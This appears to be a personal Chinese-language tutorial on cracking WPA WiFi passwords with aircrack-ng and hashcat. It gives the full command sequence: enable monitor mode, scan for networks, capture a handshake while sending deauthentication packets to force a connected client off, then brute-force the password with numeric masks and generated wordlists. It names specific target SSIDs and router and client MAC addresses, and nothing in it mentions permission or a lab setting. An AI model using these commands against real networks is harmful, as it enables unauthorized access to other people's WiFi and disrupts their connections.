# 破解 WIFI 密码

### 0. 查wlan0支持模式中有无监听（monitor）模式

~~`sudo iwconfig wlan0 mode`~~

经实践，此命令不能查(Debian)

### 1. 改成监听模式(改后wlan0就成了wlan0mon)

`sudo airmon-ng start wlan0`

### 2. 查看周围无线信息(也可以指定信道排除想排除的，例如 -c 1，只看信道为1的wifi连接情况;--bssid WIFI的MAC，只看某个WIFI的连接情况。)

`sudo airodump-ng wlan0mon`

记一两组想破解的BSSID（WIFI的MAC）和STATION（已连接的客户端MAC）

现以 `80:8F:1D:83:42:76` 和 `90:AD:F7:FA:8E:10` 为例。

最好也把WIFI名称（SSID）也记下来，例如：TP-LINK_4275，以备后用。

### 3. 模拟抓包(--ivs 包文件的格式为ivs，-c 指定为1信道，-w 指定包文件包为wifipass)

`sudo airodump-ng --ivs -c 1 -w wifipass --bssid 80:8F:1D:83:42:76 wlan0mon`

此窗口不要关，再开窗口发攻击包，观察这里的右上角，看有无出现 handshake ，出现则是包被抓到，未出现则继续增加攻击包。

### 4. 发攻击包（-0 发99个包，不够再加，赋值为0的话就是一直发）

`sudo aireplay-ng -0 99 -a 80:8F:1D:83:42:76 -c 90:AD:F7:FA:8E:10 wlan0mon`

### 5. 跑密码
两种方式：
1. 用air自带的方式，需要字典文件 dict.txt，比较慢。

    `sudo aircrack-ng wifipass-01.ivs -w dict.txt`

2. 用 hashcat  的方式， -m 2500 就是模式为 WPA

    先用 aircrack-ng 转换包的格式
    
    `sudo aircrack-ng wifipass-01.ivs -J wifipass.hccap`

    再用 hashcat 跑8位的纯数字密码（进度可以按s查看）
    
    `hashcat -m 2500 -a 3 --force wifipass.hccap "?d?d?d?d?d?d?d?d"`

    hashcat 字典模式
    
    `hashcat -m 2500 --force wifipass.hccap dict.txt`

    用 crunch 生成8位和9位的纯数字字典（第1个8为最少8位，第2个9为最多9位）
    
    `crunch 8 9 0123456789 -o dict.txt`

### 6. 退出监听模式
`sudo airmon-ng stop wlan0mon`

TP-LINK_4275
80:8F:1D:83:42:76
90:AD:F7:FA:8E:10

### 7. 示例 
监听 `wlan1mon` 信号为 `CMCC-pbHs` 信道为 `11` 无线路由（AP）的MAC为 `AC:5A:EE:D3:FC:C0` 包保存到 `CMCC-pbHs.ivs` 文件

`sudo airodump-ng wlan1mon --essid CMCC-pbHs -c 11 --bssid AC:5A:EE:D3:FC:C0 --ivs -w CMCC-pbHs`


### 8. 用脚本生成字典

```bash
$ cat p2.sh
for a in test Test TEST
do
        for b in 13800138000 18901234567 19880808
        do 
                for c in . @
                do
                        echo $a$b$c
                        echo $a$c$b
                        echo $b$c$a
                        echo $b$a$c
                        echo $c$a$b
                        echo $c$b$a
                done
        done
done
```
